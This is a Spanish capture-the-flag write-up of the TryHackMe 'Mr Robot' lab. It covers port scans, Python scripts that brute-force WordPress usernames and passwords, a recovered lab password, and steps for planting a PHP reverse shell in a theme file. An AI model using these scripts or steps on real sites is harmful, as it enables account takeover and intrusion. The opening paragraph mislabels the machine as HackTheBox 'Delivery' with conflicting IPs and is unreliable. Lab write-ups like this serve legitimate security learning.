---
title: "Mr Robot - Try Hack Me"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "assets/images/machines/THM/MrRobot/data/mrrobot.png"
  teaser_home_page: true
  icon: "assets/images/icons/TryHackMe.png"
categories:
  - Writeup
  - TryHackMe
tags:
  -
---

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/data/MR-ROBOT.jpg">
  </p>

  La máquina **Delivery** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una calificación en el rank de 4.6, **12347 USER OWNS** y **10865 SYSTEM OWNS** con la ip **10.10.10.222** y un sistema operativo **Linux**.

## Port Scan

  Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.214]** utilizando los parámetros:

  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22 y 443**:  

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/Ports.png">
  </p>


  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/PortServ.png">
  </p>

  Lo que **nmap** nos muestra es que hay un servicio **ssh** en el puerto **22** y un servicio **HTTP** en el puerto **443**.

  Cuando entre al servicio **HTTP** desde mi navegador pude ver lo siguiente:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/443.png">
  </p>

  Haciendo **fuzzing** podemos ver que cuenta con un recurso **robots.txt** y un **wp-login**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/fuzzing.png">
  </p>

  Primero iremos por el robots.txt, al entrar se pudieron ver el directorio **key-1-of-3.txt** y un recurso **fsocity.dic** el cual puedo descargar a mi maquina:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/robots.png">
  </p>

  Viendo el contenido de **fsocity.dic** puedo ver que es un diccionario con muchos strings variados, y con **858160** lineas:
  <div align="center">
  <table class="center"><tr>
  <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/dic1.png">
  <div class="caption" ></div></center></td>
  <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/dic2.png">
  <div class="caption"></div></center></td>
  </tr></table>
  </div>

  Ya sabiendo esto me dirijo al la ruta **wp-login** ahi veo que es un login de wordpress, en algunas ocasiones los logins de wordpress te permiten enumerar usuarios ya que si ponemos uno valido nos saldria un mensaje diciendo '**ERROR: The password you entered for the username Winsad is incorrect. Lost your password?**' por ejemplo.

  Para esto y ya que no conocemos los usuarios usaremos el dic para hacer un ataque de fuerza bruta, para este ataque hare un script personalizado en python el cual es el siguiete:

  ```python
#!/usr/bin/python

import requests, time
from pwn import *


url = 'http://10.10.197.4/wp-login.php'

s = requests.Session()
print ''
p1 = log.progress("Fuzzeando usuario")
time.sleep(3)
p1.status("Iniciando Fuzzing")
time.sleep(3)

with open('fsocity.dic', 'r') as f:
	for i in f:

		data = {'log' : i,
			'pwd' : 'contra'
			}

		r = s.post(url, data)
		p1.status('Probando %s' % i.strip('\n'))

		if "Invalid username." not in r.text:
			p1.success('Usuario el usuario %s valido ' % i.strip('\n'))
			break
  ```

  Con el script que me acabo de desarollar pude descubrir que el usuario **Elliot** es un usuario valido:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/fuzzU.png">
  </p>

  Ahora que tenemos el usuario haremos una fuerza bruta a la password del usuario **Elliot**, para esto adapataremos un poco el script para que ahora itere sobre la password y no el usuario:

  ```python
#!/usr/bin/python

import requests, time
from pwn import *

url = 'http://10.10.7.71/wp-login.php'
user = 'Elliot'
s = requests.Session()

print ''

p1 = log.progress('Fuzzeando password')
time.sleep(2)
p1.status('Iniciando Fuzzing')
time.sleep(3)

with open('smallwordlist', 'r') as f:

	for i in f:

		data  = {
			'log' : user,
			'pwd' : i
 		}

		r = s.post(url, data)
		p1.status('Probando password %s' % i.strip('\n'))

		if 'The password you entered for the username ' not in r.text:

			p1.success('La passwor de Elliot es %s' % i.strip('\n'))
			break

  ```
  Yo acote el diccionario ya que eran demasiadas lineas, la constraseña se encontraba en la linea 5627:ER28-0652, seria un gran punto si le metieramos hilos pero en esta ocasion no lo hare yo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/fuzzp.png">
  </p>

  Ya que encontramos el usuario y la passwod vamos al login de wordpress y ingresamos con las credenciales.

  Ya dentro es muy facil darnos una shell los pasos serian:
  - Entrar a Apparence
  - Editar el archivo **archive.php** y ingresar la shell en php en el archivo **archive.php**
  - Ponernos en escuchar por el puerto especificado en el **archive.php**
  - Entrar a la url **https://[IP Machine]/wp-content/themes/twentyfifteen/archive.php**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/paginaApparence.png">
  </p>

  Ya una vez que hicimos los pasos y entramos a la url especificada podemos ver que nos da la conexion en nuestra maquina:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/shell.png">
  </p>
